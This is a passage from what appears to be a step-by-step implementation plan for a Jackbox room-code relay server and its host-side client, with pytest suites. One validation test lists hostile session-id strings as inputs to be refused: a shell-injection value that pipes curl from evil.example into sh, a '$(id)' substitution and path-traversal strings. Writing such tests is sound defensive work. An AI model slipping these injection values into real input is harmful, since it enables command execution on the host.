        ("GET", "/sessions/nope"),
        ("GET", "/sessions/nope/subscribe"),
        ("DELETE", "/sessions/nope"),
    ],
)
async def test_an_unknown_session_is_a_404_not_a_401(method, path):
    # Spec §8. The publisher needs to tell "my session expired, stop trying
    # forever" from "my token is wrong", and a session id is not a capability
    # on its own — the QR code publishes it anyway.
    _, app = make()
    async with serving(app) as http:
        response = await http.request(method, path, headers=auth("anything"))
    assert response.status_code == 404


async def test_a_non_ascii_bearer_token_is_rejected_not_a_server_error():
    # Raw bytes, not "Bearer \xff": httpx refuses to ascii-encode that, while a
    # hand-rolled client puts the byte straight on the wire. The ASGI server
    # then hands it to Starlette, which decodes headers as latin-1.
    _, app = make()
    async with serving(app) as http:
        session = await new_session(http)
        response = await http.post(
            publish_url(session),
            json={"code": "WEWW", "ts": 1000.0},
            headers=[(b"authorization", b"Bearer \xff")],
        )
    assert response.status_code == 401


# --- publishing ---------------------------------------------------------

async def test_publishing_stores_the_code_against_that_session():
    state, app = make()
    async with serving(app) as http:
        session = await new_session(http)
        response = await http.post(
            publish_url(session),
            json={"code": "WEWW", "ts": 1000.0},
            headers=auth(session["publisher_token"]),
        )
    assert response.status_code == 204
    assert state.current_code(session["session_id"]).code == "WEWW"


async def test_publishing_rejects_a_non_finite_timestamp():
    # json.loads accepts a bare NaN, so this reaches the handler as a float.
    _, app = make()
    async with serving(app) as http:
        session = await new_session(http)
        response = await http.post(
            publish_url(session),
            content='{"code": "WEWW", "ts": NaN}',
            headers={
                **auth(session["publisher_token"]),
                "Content-Type": "application/json",
            },
        )
    assert response.status_code == 400


async def test_publishing_rejects_an_implausible_code():
    _, app = make()
    async with serving(app) as http:
        session = await new_session(http)
        response = await http.post(
            publish_url(session),
            json={"code": "not a code", "ts": 1000.0},
            headers=auth(session["publisher_token"]),
        )
    assert response.status_code == 400


async def test_publishing_to_a_session_that_expired_mid_game_is_a_404():
    # The publisher latches on this and stops trying; the LAN server is
    # unaffected, so the game night carries on regardless.
    state, app = make()
    async with serving(app) as http:
        session = await new_session(http)
        state.delete_session(session["session_id"])
        response = await http.post(
            publish_url(session),
            json={"code": "WEWW", "ts": 1000.0},
            headers=auth(session["publisher_token"]),
        )
    assert response.status_code == 404


async def test_a_wrong_token_on_a_live_session_is_a_401_not_a_404():
    # The other half of the pair above: existence and authorisation are
    # different answers, and the publisher acts on the difference.
    _, app = make()
    async with serving(app) as http:
        session = await new_session(http)
        response = await http.post(
            publish_url(session),
            json={"code": "WEWW", "ts": 1000.0},
            headers=auth("not-the-token"),
        )
    assert response.status_code == 401


# --- subscribing --------------------------------------------------------

async def test_a_subscriber_receives_the_current_code_on_connect():
    state, app = make()
    async with serving(app) as http:
        session = await new_session(http)
        state.publish(session["session_id"], "WEWW", 1000.0)
        async with http.stream(
            "GET", subscribe_url(session), headers=auth(session["subscriber_token"])
        ) as response:
            assert response.status_code == 200
            assert await first_event(response) == {"code": "WEWW", "ts": 1000.0}


async def test_a_subscriber_is_not_sent_a_stale_code_on_connect():
    # Jackbox recycles four-letter codes; a stale one may belong to a
    # stranger's room by the next day.
    clock = Clock(1000.0)
    state, app = make(clock)
    async with serving(app) as http:
        session = await new_session(http)
        state.publish(session["session_id"], "WEWW", 1000.0)
        clock.t = 2000.0
        async with http.stream(
            "GET", subscribe_url(session), headers=auth(session["subscriber_token"])
        ) as response:
            with pytest.raises(asyncio.TimeoutError):
                await first_event(response, timeout=0.5)


async def test_a_subscriber_receives_a_code_published_after_connecting():
    _, app = make()
    async with serving(app) as http:
        session = await new_session(http)
        async with http.stream(
            "GET", subscribe_url(session), headers=auth(session["subscriber_token"])
        ) as response:
            await http.post(
                publish_url(session),
                json={"code": "ZZZZ", "ts": 1000.0},
                headers=auth(session["publisher_token"]),
            )
            assert await first_event(response) == {"code": "ZZZZ", "ts": 1000.0}


async def test_the_subscriber_cap_refuses_the_seventeenth_phone():
    _, app = make()
    async with serving(app) as http:
        session = await new_session(http)
        url, headers = subscribe_url(session), auth(session["subscriber_token"])
        async with contextlib.AsyncExitStack() as stack:
            for _ in range(MAX_SUBSCRIBERS_PER_SESSION):
                response = await stack.enter_async_context(
                    http.stream("GET", url, headers=headers)
                )
                assert response.status_code == 200
            refused = await stack.enter_async_context(
                http.stream("GET", url, headers=headers)
            )
            assert refused.status_code == 429


# --- session info -------------------------------------------------------

async def test_the_publisher_can_see_that_a_phone_arrived():
    # This is how the QR window knows to close itself.
    _, app = make()
    async with serving(app) as http:
        session = await new_session(http)
        info_url = f"/sessions/{session['session_id']}"
        headers = auth(session["publisher_token"])
        before = await http.get(info_url, headers=headers)
        assert before.json()["subscribers"] == 0
        async with http.stream(
            "GET", subscribe_url(session), headers=auth(session["subscriber_token"])
        ) as response:
            assert response.status_code == 200
            after = await http.get(info_url, headers=headers)
        assert after.json()["subscribers"] == 1


async def test_polling_the_session_does_not_keep_it_alive():
    # Only publishing and subscribing count as activity. The QR window polls
    # this once a second and must not be able to extend a session by doing so.
    clock = Clock(1000.0)
    state, app = make(clock)
    async with serving(app) as http:
        session = await new_session(http)
        clock.t += SESSION_IDLE_SECONDS + 1
        info = await http.get(
            f"/sessions/{session['session_id']}",
            headers=auth(session["publisher_token"]),
        )
        assert info.status_code == 200
    assert state.evict_expired() == [session["session_id"]]


async def test_expires_at_moves_forward_when_the_host_publishes():
    clock = Clock(1000.0)
    _, app = make(clock)
    async with serving(app) as http:
        session = await new_session(http)
        clock.t += 60.0
        await http.post(
            publish_url(session),
            json={"code": "WEWW", "ts": 1060.0},
            headers=auth(session["publisher_token"]),
        )
        info = await http.get(
            f"/sessions/{session['session_id']}",
            headers=auth(session["publisher_token"]),
        )
    assert info.json()["expires_at"] == session["expires_at"] + 60.0


# --- expiry and deletion ------------------------------------------------

async def test_a_listening_phone_keeps_its_session_alive(monkeypatch):
    """A whole game night is normally a single publish.

    The publisher de-duplicates and a Jackbox pack keeps one room code across
    many games, so without touching on the keepalive a session with a phone
    listening all evening is evicted out from under it at the four-hour mark.
    """
    monkeypatch.setattr("relay.app.KEEPALIVE_SECONDS", 0.05)
    clock = Clock(1000.0)
    state, app = make(clock)
    async with serving(app) as http:
        session = await new_session(http)
        async with http.stream(
            "GET", subscribe_url(session), headers=auth(session["subscriber_token"])
        ) as response:
            assert response.status_code == 200
            clock.t = 5000.0
            await asyncio.sleep(0.3)  # several keepalives at 50ms
            assert state.session(session["session_id"]).last_activity == 5000.0


async def test_evicting_an_idle_session_ends_its_stream():
    # Dropping the session record without closing the queue would leak the
    # stream and the phone would sit there forever on a dead session.
    # The real keepalive is 20s, so none fires during this test and nothing
    # touches the session behind the test's back.
    clock = Clock(1000.0)
    _, app = make(clock)
    async with serving(app) as http:
        session = await new_session(http)
        async with http.stream(
            "GET", subscribe_url(session), headers=auth(session["subscriber_token"])
        ) as response:
            assert response.status_code == 200
            clock.t += SESSION_IDLE_SECONDS + 1
            await http.post("/sessions")  # any request that reaps
            assert await stream_ends(response) is True


async def test_deleting_a_session_ends_its_stream_and_frees_capacity():
    state, app = make()
    async with serving(app) as http:
        session = await new_session(http)
        async with http.stream(
            "GET", subscribe_url(session), headers=auth(session["subscriber_token"])
        ) as response:
            assert response.status_code == 200
            deleted = await http.delete(
                f"/sessions/{session['session_id']}",
                headers=auth(session["publisher_token"]),
            )
            assert deleted.status_code == 204
            assert await stream_ends(response) is True
    assert state.session(session["session_id"]) is None


async def test_deleting_requires_the_publisher_token():
    state, app = make()
    async with serving(app) as http:
        session = await new_session(http)
        response = await http.delete(
            f"/sessions/{session['session_id']}",
            headers=auth(session["subscriber_token"]),
        )
    assert response.status_code == 401
    assert state.session(session["session_id"]) is not None


# --- rate limiting ------------------------------------------------------

async def test_session_creation_is_rate_limited():
    _, app = make(create_limiter=RateLimiter(limit=1, window_seconds=60.0))
    async with serving(app) as http:
        first = await http.post("/sessions")
        second = await http.post("/sessions")
    assert first.status_code == 201
    assert second.status_code == 429


async def test_one_session_exhausting_its_publish_budget_spares_the_other():
    # A shared publish budget would let one noisy host lock out every other
    # game night on the relay.
    _, app = make(
        publish_limiter_factory=lambda: RateLimiter(limit=1, window_seconds=60.0)
    )
    async with serving(app) as http:
        a, b = await new_session(http), await new_session(http)
        await http.post(
            publish_url(a),
            json={"code": "WEWW", "ts": 1000.0},
            headers=auth(a["publisher_token"]),
        )
        exhausted = await http.post(
            publish_url(a),
            json={"code": "ZZZZ", "ts": 1000.0},
            headers=auth(a["publisher_token"]),
        )
        other = await http.post(
            publish_url(b),
            json={"code": "WEWW", "ts": 1000.0},
            headers=auth(b["publisher_token"]),
        )
    assert exhausted.status_code == 429
    assert other.status_code == 204


async def test_a_bad_token_is_refused_before_the_rate_limiter_is_consulted():
    # Otherwise junk credentials exhaust the budget and lock out the holder.
    _, app = make(
        publish_limiter_factory=lambda: RateLimiter(limit=0, window_seconds=60.0)
    )
    async with serving(app) as http:
        session = await new_session(http)
        body = {"code": "WEWW", "ts": 1000.0}
        wrong = await http.post(publish_url(session), json=body, headers=auth("wrong"))
        right = await http.post(
            publish_url(session), json=body, headers=auth(session["publisher_token"])
        )
    assert wrong.status_code == 401
    assert right.status_code == 429


# --- queue hygiene (unit level: these need to poke at _queues) ----------

async def test_a_subscriber_that_stops_draining_is_dropped_and_closed():
    # Bounding the queue caps the damage, but unregistering alone is not
    # enough: an unregistered queue can no longer be reached by _release, so
    # its generator would keepalive forever, outlive both eviction and DELETE,
    # and have freed a subscriber slot for a replacement to do it again.
    relay = Relay(RelayState(now=Clock()))
    session = relay.state.create_session()
    queue = asyncio.Queue(maxsize=2)
    relay._queues[session.session_id] = {queue}
    for _ in range(3):
        relay._fan_out(session.session_id, {"code": "WEWW", "ts": 1000.0})
    assert queue not in relay._queues[session.session_id]
    drained = [queue.get_nowait() for _ in range(queue.qsize())]
    assert drained[-1] is None  # the close sentinel actually landed


async def test_an_abandoned_queue_does_not_stall_a_live_subscriber():
    relay = Relay(RelayState(now=Clock()))
    session = relay.state.create_session()
    abandoned, live = asyncio.Queue(maxsize=1), asyncio.Queue(maxsize=8)
    relay._queues[session.session_id] = {abandoned, live}
    for _ in range(3):
        relay._fan_out(session.session_id, {"code": "WEWW", "ts": 1000.0})
    assert live in relay._queues[session.session_id]
    assert live.qsize() == 3


async def test_releasing_a_session_closes_even_a_queue_that_is_full():
    # The close sentinel has to displace a payload, or the generator would run
    # until the client's TCP connection died.
    relay = Relay(RelayState(now=Clock()))
    session = relay.state.create_session()
    queue = asyncio.Queue(maxsize=1)
    relay._queues[session.session_id] = {queue}
    queue.put_nowait({"code": "WEWW", "ts": 1000.0})
    relay._release(session.session_id)
    assert queue.get_nowait() is None


async def test_releasing_a_session_forgets_its_rate_limiter():
    # Otherwise the limiter dict grows for the life of the process.
    relay = Relay(RelayState(now=Clock()))
    session = relay.state.create_session()
    relay._publish_limiters[session.session_id] = RateLimiter(1, 60.0)
    relay._release(session.session_id)
    assert session.session_id not in relay._publish_limiters


# --- the join page and logging ------------------------------------------

async def test_the_join_page_is_served_without_credentials():
    _, app = make()
    async with serving(app) as http:
        response = await http.get("/j")
    assert response.status_code == 200
    assert "jbvip" in response.text


async def test_the_relay_logs_neither_a_room_code_nor_a_token(caplog):
    _, app = make()
    with caplog.at_level("DEBUG", logger="relay.app"):
        async with serving(app) as http:
            session = await new_session(http)
            await http.post(
                publish_url(session),
                json={"code": "WEWW", "ts": 1000.0},
                headers=auth(session["publisher_token"]),
            )
    assert "WEWW" not in caplog.text
    assert session["publisher_token"] not in caplog.text
    assert session["subscriber_token"] not in caplog.text
```

> **If `test_the_subscriber_cap_refuses_the_seventeenth_phone` proves flaky**, it is connection-pool contention in the single shared `httpx.AsyncClient`, not a bug in the relay — give each subscriber its own client rather than raising the cap or deleting the test.

> On `test_publishing_to_a_session_that_expired_mid_game_is_a_404`: the name and the assertion agree, and both are correct. `_refuse` checks existence before authorisation, so a deleted session answers 404 even though its tokens died with it. (An earlier draft of this plan returned 401 here and carried a note saying so; that note was stale and has been removed. The 404/401 split is deliberate — see `_refuse`'s docstring.) The `KeyError` → 404 branch inside `publish` is a separate guard for a session evicted during `await request.json()`; it is not reachable from a test and should not be contorted into one.

- [ ] **Step 3: Run the tests to verify they fail**

Run: `.venv/bin/python -m pytest tests/test_relay_app.py -q`
Expected: collection error — `ModuleNotFoundError: No module named 'relay.app'`.

- [ ] **Step 4: Write `relay/app.py`**

```python
"""ASGI relay: many game nights at once, each blind to the others.

Thin by design — every decision lives in relay.state. This layer owns only the
two things that cannot live there: the live SSE queues and the rate limiters.
Room codes and tokens are never logged here or anywhere else in the relay.
"""
import asyncio
import json
import logging
import time

from starlette.applications import Starlette
from starlette.responses import (
    HTMLResponse,
    JSONResponse,
    Response,
    StreamingResponse,
)
from starlette.routing import Route

from relay.state import (
    MAX_SUBSCRIBERS_PER_SESSION,
    RateLimiter,
    RelayState,
    SessionCapacityError,
)

logger = logging.getLogger(__name__)

KEEPALIVE_SECONDS = 20.0
# A subscriber that has stopped draining is dropped once this many payloads
# have backed up. Also the backstop for a stream cancelled before its generator
# body runs, whose `finally` never executes and so never unregisters the queue.
SUBSCRIBER_QUEUE_SIZE = 64
# POST /sessions is unauthenticated by design, so its budget can only be
# global. The reverse proxy in front does per-client limiting; this caps the
# total damage one bad afternoon can do.
CREATE_LIMIT_PER_MINUTE = 30
# Publishing is authenticated, so the budget is per session: one noisy host
# must never be able to lock another game night out.
PUBLISH_LIMIT_PER_MINUTE = 60

# The subscriber token lives in the URL fragment, which browsers never
# transmit, so nothing server-side — including this page — can see it.
_JOIN_PAGE = (
    "<!doctype html><meta charset=utf-8>"
    "<meta name=viewport content='width=device-width,initial-scale=1'>"
    "<title>jbvip</title>"
    "<p style='font:1rem/1.5 system-ui;margin:2rem'>"
    "This QR code pairs a phone with a Jackbox host. Open it in the jbvip app."
)

_UNAUTHORIZED = {"error": "unauthorized"}


def _bearer(request) -> str:
    header = request.headers.get("authorization", "")
    prefix = "Bearer "
    return header[len(prefix):] if header.startswith(prefix) else ""


class Relay:
    def __init__(self, state: RelayState, *, create_limiter=None,
                 publish_limiter_factory=None):
        self.state = state
        self._queues: dict[str, set[asyncio.Queue]] = {}
        self._publish_limiters: dict[str, RateLimiter] = {}
        self._create_limiter = create_limiter or RateLimiter(
            limit=CREATE_LIMIT_PER_MINUTE, window_seconds=60.0
        )
        self._new_publish_limiter = publish_limiter_factory or (
            lambda: RateLimiter(limit=PUBLISH_LIMIT_PER_MINUTE, window_seconds=60.0)
        )

    # --- bookkeeping ---
    def _reap(self) -> None:
        """Drop idle sessions and close whatever was still listening to them."""
        for session_id in self.state.evict_expired():
            self._release(session_id)

    @staticmethod
    def _close_queue(queue: asyncio.Queue) -> None:
        """Signal a stream to end. Works even on a queue nobody is draining."""
        try:
            queue.put_nowait(None)  # sentinel: the stream generator returns
        except asyncio.QueueFull:
            # Displace a payload rather than leave the generator alive until
            # the client's TCP connection eventually dies.
            queue.get_nowait()
            queue.put_nowait(None)

    def _release(self, session_id: str) -> None:
        """Forget a dead session's queues and limiter, ending its streams.

        Idempotent: eviction and an explicit DELETE can both reach the same id.
        """
        self._publish_limiters.pop(session_id, None)
        for queue in self._queues.pop(session_id, ()):
            self._close_queue(queue)

    def _fan_out(self, session_id: str, payload: dict) -> None:
        for queue in list(self._queues.get(session_id, ())):
            try:
                queue.put_nowait(payload)
            except asyncio.QueueFull:
                # It is not draining and never will. Unregistering it is not
                # enough — an unregistered queue can no longer be reached by
                # _release, so its generator would keepalive forever and
                # survive both eviction and DELETE, and it would have freed a
                # slot under MAX_SUBSCRIBERS_PER_SESSION for a replacement.
                # Close it properly so the socket actually goes away.
                self._queues.get(session_id, set()).discard(queue)
                self._close_queue(queue)

    # --- routes ---
    def _refuse(self, request, session_id, *, subscriber=False):
        """None when the caller may proceed, else the response to return.

        Spec §8 distinguishes two failures. A session that no longer exists is
        a **404**: the publisher must be able to tell "my session expired,
        stop trying forever" from "my token is wrong". A session that exists
        but was handed the wrong token is a **401**, because a session id is
        not a capability on its own — confirming one exists gives away
        nothing that the QR code did not already publish.
        """
        if self.state.session(session_id) is None:
            return JSONResponse({"error": "no such session"}, status_code=404)
        holds = self.state.is_subscriber if subscriber else self.state.is_publisher
        if not holds(session_id, _bearer(request)):
            return JSONResponse(_UNAUTHORIZED, status_code=401)
        return None

    async def create_session(self, request):
        if not self._create_limiter.allow():
            return JSONResponse({"error": "rate limited"}, status_code=429)
        self._reap()
        try:
            session = self.state.create_session()
        except SessionCapacityError:
            # Spec §8: never end a live game night to admit a stranger.
            return JSONResponse({"error": "at capacity"}, status_code=503)
        return JSONResponse(
            {
                "session_id": session.session_id,
                "publisher_token": session.publisher_token,
                "subscriber_token": session.subscriber_token,
                "expires_at": self.state.expires_at(session.session_id),
            },
            status_code=201,
            headers={"Cache-Control": "no-store"},
        )

    async def get_session(self, request):
        session_id = request.path_params["session_id"]
        refusal = self._refuse(request, session_id)
        if refusal is not None:
            return refusal
        # Deliberately does not touch(): the QR window polls this once a
        # second, and polling must not be able to keep a session alive.
        return JSONResponse(
            {
                "subscribers": len(self._queues.get(session_id, ())),
                "expires_at": self.state.expires_at(session_id),
            },
            headers={"Cache-Control": "no-store"},
        )

    async def delete_session(self, request):
        session_id = request.path_params["session_id"]
        refusal = self._refuse(request, session_id)
        if refusal is not None:
            return refusal
        self.state.delete_session(session_id)
        self._release(session_id)
        return Response(status_code=204)

    async def publish(self, request):
        session_id = request.path_params["session_id"]
        refusal = self._refuse(request, session_id)
        if refusal is not None:
            return refusal
        limiter = self._publish_limiters.setdefault(
            session_id, self._new_publish_limiter()
        )
        if not limiter.allow():
            return JSONResponse({"error": "rate limited"}, status_code=429)
        try:
            body = await request.json()
            code = body["code"]
            ts = float(body.get("ts") or time.time())
        except (ValueError, TypeError, KeyError):
            return JSONResponse({"error": "bad request"}, status_code=400)
        try:
            changed = self.state.publish(session_id, code, ts)
        except ValueError:
            return JSONResponse({"error": "bad request"}, status_code=400)
        except KeyError:
            # `await request.json()` above is a real suspension point: another
            # request's reap can evict this session inside it. Without this the
            # host would get a 500 for something it did nothing wrong.
            return JSONResponse({"error": "no such session"}, status_code=404)
        if changed:
            self._fan_out(session_id, {"code": code, "ts": ts})
        self._reap()
        return Response(status_code=204)

    async def subscribe(self, request):
        session_id = request.path_params["session_id"]
        refusal = self._refuse(request, session_id, subscriber=True)
        if refusal is not None:
            return refusal
        queues = self._queues.setdefault(session_id, set())
        if len(queues) >= MAX_SUBSCRIBERS_PER_SESSION:
            return JSONResponse({"error": "too many subscribers"}, status_code=429)

        # NO `await` from here to the return. A code published in that window
        # would be lost: too late for the seed, too early for the fan-out.
        queue: asyncio.Queue = asyncio.Queue(maxsize=SUBSCRIBER_QUEUE_SIZE)
        queues.add(queue)
        self.state.touch(session_id)
        current = self.state.current_code(session_id)
        if current is not None:
            queue.put_nowait({"code": current.code, "ts": current.ts})

        async def stream():
            try:
                while True:
                    try:
                        payload = await asyncio.wait_for(
                            queue.get(), KEEPALIVE_SECONDS
                        )
                    except asyncio.TimeoutError:
                        # Touch on every keepalive, not just on connect. A
                        # whole game night is normally ONE publish — the
                        # publisher de-duplicates and a pack keeps one room
                        # code across many games — so a session with a phone
                        # listening all evening would otherwise be evicted out
                        # from under it at the four-hour mark. Spec §5.1
                        # promises the opposite; this is what makes it true.
                        self.state.touch(session_id)
                        yield b": keepalive\n\n"
                        continue
                    if payload is None:  # the session went away
                        return
                    yield f"data: {json.dumps(payload)}\n\n".encode()
            finally:
                self._queues.get(session_id, set()).discard(queue)

        return StreamingResponse(
            stream(),
            media_type="text/event-stream",
            headers={"Cache-Control": "no-store", "X-Accel-Buffering": "no"},
        )

    async def join_page(self, request):
        return HTMLResponse(_JOIN_PAGE, headers={"Cache-Control": "no-store"})


def build_app(state: RelayState, *, create_limiter=None,
              publish_limiter_factory=None) -> Starlette:
    relay = Relay(
        state,
        create_limiter=create_limiter,
        publish_limiter_factory=publish_limiter_factory,
    )
    app = Starlette(
        routes=[
            Route("/sessions", relay.create_session, methods=["POST"]),
            # Two routes on one path: Starlette records a partial match on a
            # method mismatch and keeps looking, so GET and DELETE both
            # resolve and anything else still gets a 405.
            Route("/sessions/{session_id}", relay.get_session, methods=["GET"]),
            Route("/sessions/{session_id}", relay.delete_session,
                  methods=["DELETE"]),
            Route("/sessions/{session_id}/publish", relay.publish,
                  methods=["POST"]),
            Route("/sessions/{session_id}/subscribe", relay.subscribe,
                  methods=["GET"]),
            Route("/j", relay.join_page, methods=["GET"]),
        ]
    )
    app.state.relay = relay
    return app


def create_app() -> Starlette:
    """Entry point for `uvicorn --factory relay.app:create_app`.

    Takes no configuration at all: there is no longer a secret to inject and
    nothing to load from disk.
    """
    return build_app(RelayState())
```

- [ ] **Step 5: Run the tests to verify they pass**

Run: `.venv/bin/python -m pytest tests/test_relay_app.py -q` — expected PASS.
Then `.venv/bin/python -m pytest -q` — the whole suite green.

- [ ] **Step 6: Smoke-test the real server**

The unit tests all build the app by hand; this proves the actual uvicorn entry point works with no environment at all.

```bash
.venv/bin/uvicorn --factory relay.app:create_app --host 127.0.0.1 --port 8479 &
sleep 1
curl -sS -X POST http://127.0.0.1:8479/sessions
curl -sS http://127.0.0.1:8479/j
kill %1
```

Expected: a JSON body with four fields, then the one-line HTML page. Neither command should need a token.

- [ ] **Step 7: Commit**

```bash
git add relay/app.py tests/test_relay_app.py tests/helpers.py
git commit -m "feat(relay): serve many sessions at once over six routes

Anyone can create a session; its publisher and subscriber tokens are
returned once and never stored. A subscriber is attached to one session's
queue and cannot receive another's code — the test that asserts this is
the point of the whole rework."
```

---

### Task 3: `host/session.py` — the host-side client and `PairingWaiter`

Spec §5.3. Stdlib `urllib` only, injected transport and clock, **no `tkinter` import**. All the host-side logic worth testing lives here so that Task 4 can be a dumb window.

**Files:**
- Create: `host/__init__.py` (empty)
- Create: `host/session.py`
- Create: `tests/test_host_session.py`

**Interfaces:**
- Consumes, from Task 2: the HTTP surface, and `tests/helpers.py` for the seam tests.
- Produces, for Tasks 4 and 6:
  - `SessionCredentials(base_url, session_id, publisher_token, subscriber_token)` — frozen dataclass. `base_url` is stored already normalised (no trailing slash).
  - `create_session(base_url, *, call=_urllib_call) -> SessionCredentials` — **raises** on transport failure
  - `qr_payload(credentials) -> str`
  - `subscriber_count(credentials, *, call=_urllib_call) -> int` — raises on transport failure
  - `delete_session(credentials, *, call=_urllib_call) -> bool` — never raises
  - `write_session_env(path, credentials) -> None` — mode 0600
  - `credentials_from_env(environ=os.environ) -> SessionCredentials | None`
  - `PairingWaiter(count, *, now=time.monotonic, timeout=PAIRING_TIMEOUT_SECONDS)` with `.poll() -> str`, `.remaining() -> float`, `.state`, `.subscribers`, `.error`; states `WAITING`/`PAIRED`/`TIMED_OUT`
  - `main(argv=None) -> int` — `python3 -m host.session --delete`
  - Constants `PAIRING_TIMEOUT_SECONDS = 120.0`, `POLL_SECONDS = 1.0`

**Two design decisions:**

1. **Library functions raise; only `delete_session` swallows.** The launcher is the layer that degrades to LAN-only, and it needs to know creation failed. Deletion is best-effort cleanup on an exit path where raising would be actively harmful.
2. **A failed poll does not end the wait.** Only the deadline does. A one-second network blip while the user is fumbling with their phone camera must not close the window.

- [ ] **Step 1: Write the failing tests**

```python
import asyncio
import json
import stat
import subprocess
import urllib.error
import urllib.request

import pytest

from host import session as host_session
from host.session import (
    PairingWaiter,
    SessionCredentials,
    create_session,
    credentials_from_env,
    delete_session,
    qr_payload,
    subscriber_count,
    write_session_env,
)
from relay.app import build_app
from relay.state import RelayState
from tests.helpers import Clock, serving


class RecordingCall:
    """Stands in for the urllib round trip so no test touches the network."""

    def __init__(self, *responses, exception=None):
        self.calls = []
        self.responses = list(responses)
        self.exception = exception

    def __call__(self, url, method, token):
        self.calls.append((url, method, token))
        if self.exception is not None:
            raise self.exception
        return self.responses.pop(0) if self.responses else None


CREDENTIALS = SessionCredentials(
    base_url="https://relay.example",
    session_id="sess-1",
    publisher_token="pub-token",
    subscriber_token="sub-token",
)

CREATED = {
    "session_id": "sess-1",
    "publisher_token": "pub-token",
    "subscriber_token": "sub-token",
    "expires_at": 15400.0,
}


# --- create -------------------------------------------------------------

def test_create_session_posts_to_the_sessions_endpoint_with_no_credential():
    call = RecordingCall(CREATED)
    credentials = create_session("https://relay.example", call=call)
    assert call.calls == [("https://relay.example/sessions", "POST", None)]
    assert credentials == CREDENTIALS


def test_a_trailing_slash_does_not_double_up():
    call = RecordingCall(CREATED)
    credentials = create_session("https://relay.example/", call=call)
    assert call.calls[0][0] == "https://relay.example/sessions"
    assert credentials.base_url == "https://relay.example"


@pytest.mark.parametrize("base", ["http://relay.example", "relay.example", "ftp://x"])
def test_a_non_https_base_url_is_refused(base):
    # TLS terminates in front of the relay, so the client is the only place
    # this can be enforced.
    with pytest.raises(ValueError):
        create_session(base, call=RecordingCall(CREATED))


def test_create_session_raises_when_the_relay_is_unreachable():
    # The launcher is the layer that degrades to LAN-only; it has to be told.
    call = RecordingCall(exception=urllib.error.URLError("no route to host"))
    with pytest.raises(urllib.error.URLError):
        create_session("https://relay.example", call=call)


@pytest.mark.parametrize("hostile", [
    "x; curl evil.example | sh",   # the launcher sources this file
    "$(id)",
    "../../other-session",         # would rewrite the publish URL
    "abc?role=host",
    "abc#frag",
    "abc/def",
    "",
    "tökén",
])
def test_an_implausible_session_id_from_the_relay_is_refused(hostile):
    # The host interpolates these into a URL and writes them into a file the
    # launcher sources. shlex.quote covers the shell; this covers the URL, and
    # neither should ever be the only thing standing between a hostile relay
    # and the host PC. Real ids are secrets.token_urlsafe output.
    call = RecordingCall({**CREATED, "session_id": hostile})
    with pytest.raises(ValueError):
        create_session("https://relay.example", call=call)


@pytest.mark.parametrize("field", ["publisher_token", "subscriber_token"])
def test_an_implausible_token_from_the_relay_is_refused(field):
    call = RecordingCall({**CREATED, field: "tok en/../x"})
    with pytest.raises(ValueError):
        create_session("https://relay.example", call=call)


# --- the QR payload -----------------------------------------------------

def test_the_qr_payload_puts_the_token_in_the_fragment():
    # Browsers never transmit a fragment, so the credential cannot reach the
    # relay's access log, a proxy log or a Referer header.
    payload = qr_payload(CREDENTIALS)
    assert payload == "https://relay.example/j#sess-1.sub-token"
    before_fragment, _, fragment = payload.partition("#")
    assert "sub-token" not in before_fragment
    assert fragment == "sess-1.sub-token"


def test_the_qr_payload_never_carries_the_publisher_token():
    assert "pub-token" not in qr_payload(CREDENTIALS)


# --- polling ------------------------------------------------------------

def test_subscriber_count_reads_the_session_with_the_publisher_token():
    call = RecordingCall({"subscribers": 2, "expires_at": 15400.0})
    assert subscriber_count(CREDENTIALS, call=call) == 2
    assert call.calls == [
        ("https://relay.example/sessions/sess-1", "GET", "pub-token")
    ]


# --- deletion -----------------------------------------------------------

def test_delete_session_deletes_with_the_publisher_token():
    call = RecordingCall()
    assert delete_session(CREDENTIALS, call=call) is True
    assert call.calls == [
        ("https://relay.example/sessions/sess-1", "DELETE", "pub-token")
    ]


def test_delete_session_never_raises():
    # It runs on the launcher's exit path, where raising helps nobody.
    call = RecordingCall(exception=urllib.error.URLError("relay down"))
    assert delete_session(CREDENTIALS, call=call) is False


# --- the environment file -----------------------------------------------

def test_the_session_env_file_is_only_readable_by_its_owner(tmp_path):
    path = tmp_path / "session.env"
    write_session_env(path, CREDENTIALS)
    assert stat.S_IMODE(path.stat().st_mode) == 0o600


def test_the_session_env_file_is_sourceable_by_sh(tmp_path):
    path = tmp_path / "session.env"
    write_session_env(path, CREDENTIALS)
    done = subprocess.run(
        ["sh", "-c", f'. "{path}"; printf "%s\\n%s\\n" '
                     '"$JBVIP_SESSION_ID" "$JBVIP_SESSION_TOKEN"'],
        capture_output=True, text=True, check=True,
    )
    assert done.stdout.splitlines() == ["sess-1", "pub-token"]


def test_the_session_env_file_carries_the_publisher_token_only(tmp_path):
    # The extractor publishes; it has no business subscribing, and the
    # subscriber token belongs to the phone alone.
    path = tmp_path / "session.env"
    write_session_env(path, CREDENTIALS)
    written = path.read_text()
    assert "pub-token" in written
    assert "sub-token" not in written


def test_credentials_can_be_read_back_out_of_the_environment():
    environ = {
        "JBVIP_RELAY_URL": "https://relay.example/",
        "JBVIP_SESSION_ID": "sess-1",
        "JBVIP_SESSION_TOKEN": "pub-token",
    }
    credentials = credentials_from_env(environ)
    assert credentials.session_id == "sess-1"
    assert credentials.publisher_token == "pub-token"
    assert credentials.base_url == "https://relay.example"


@pytest.mark.parametrize("missing", [
    "JBVIP_RELAY_URL", "JBVIP_SESSION_ID", "JBVIP_SESSION_TOKEN"
])
def test_credentials_from_a_half_set_environment_are_none(missing):
    environ = {
        "JBVIP_RELAY_URL": "https://relay.example",
        "JBVIP_SESSION_ID": "sess-1",
        "JBVIP_SESSION_TOKEN": "pub-token",
    }
    del environ[missing]
    assert credentials_from_env(environ) is None


# --- PairingWaiter ------------------------------------------------------

def test_the_waiter_keeps_waiting_while_no_phone_has_arrived():
    waiter = PairingWaiter(lambda: 0, now=Clock(0.0), timeout=120.0)
    assert waiter.poll() == PairingWaiter.WAITING
    assert waiter.subscribers == 0


def test_the_waiter_reports_paired_once_a_phone_subscribes():
    waiter = PairingWaiter(lambda: 1, now=Clock(0.0), timeout=120.0)
    assert waiter.poll() == PairingWaiter.PAIRED
    assert waiter.subscribers == 1


def test_the_waiter_stops_polling_once_paired():
    calls = []

    def count():
        calls.append(1)
        return 1

    waiter = PairingWaiter(count, now=Clock(0.0), timeout=120.0)
    waiter.poll()
    waiter.poll()
    assert len(calls) == 1


def test_the_waiter_times_out_when_the_deadline_passes():
    clock = Clock(0.0)
    waiter = PairingWaiter(lambda: 0, now=clock, timeout=120.0)
    assert waiter.poll() == PairingWaiter.WAITING
    clock.t = 120.0
